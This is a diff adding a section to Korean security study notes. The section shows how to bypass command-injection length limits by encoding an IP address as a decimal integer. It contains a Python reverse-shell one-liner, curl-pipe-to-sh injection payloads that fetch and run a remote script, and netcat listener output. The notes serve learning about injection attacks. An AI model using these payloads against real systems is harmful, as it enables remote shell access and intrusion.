@@ -431,6 +431,40 @@
 <br/>
 
 * IP 주소 변환을 이용하는 방법
+    + IP 주소 변환
+        - 짧은 길이의 도메인을 이용하거나, IP 형시을 long 타입 형식으로 변환(ip2long)하는 등의 방법을 이용해 IP Address를 짧게 입력할 수 있음
+        - 📌 ***변환된 IP 주소는 다양한 애플리케이션에서도 해석이 가능하기 때문에 기능이 정상적으로 수행됨***
+    + 예시: long 타입으로 변환한 IP 주소를 이용하거 네트워크 도구를 이용한 리버스 쉘(Reverse Shell) 공격
+        - [1] IP 주소를 long 타입으로 변환함
+            ```python
+            #!/usr/bin/python3
+            import ipaddress
+            int(ipaddress.IPv4Address("127.0.0.1")) # long 타입으로 변환한 결과: 2130706433
+            ```
+        - [2] Command Injection 취약점이 발생하는 쉘이 최종적으로 실행할 명령어가 포함된 페이지(index.html)를 작성함
+            ```linux
+            python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("127.0.0.1",1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
+            ```
+        - [3] ```curl```, ```wget``` 등의 네트워크 도구를 통해 외부 서버에 존재하는 index.html를 다운받아 실행할 수 있도록 메타 문자를 설정함
+            ```
+            curl 2130706433|sh
+            $(curl 2130706433)
+            `curl 2130706433`
+            ```
+            + ```curl``` 명령은 변환된 long 타입의 IP 주소(```2130706433```)를 해석하여 공격 대상 서버에서 공격자 웹 서버에 리버스 쉘을 실행하는 스크립트를 받아옴 → 이를 실행하면 쉘을 획득할 수 있음
+        - [4] 3번의 명령어가 성공적으로 실행되게 되면 리버스 쉘이 실행됨
+            ```linux
+            $ nc -l -p 1234 -k -v
+            Listening on [0.0.0.0] (family 0, port 1234)
+            Connection from [127.0.0.1] port 1234 [tcp/*] accepted (family 2, sport 53220)
+            $ id
+            uid=1000(users) gid=1000(users) groups=1000(users)
+            $
+            ```
+
+<br/><br/>
+
+### 입력 값의 내용이 제한된 상황
 
 <br/><br/><br/>
 
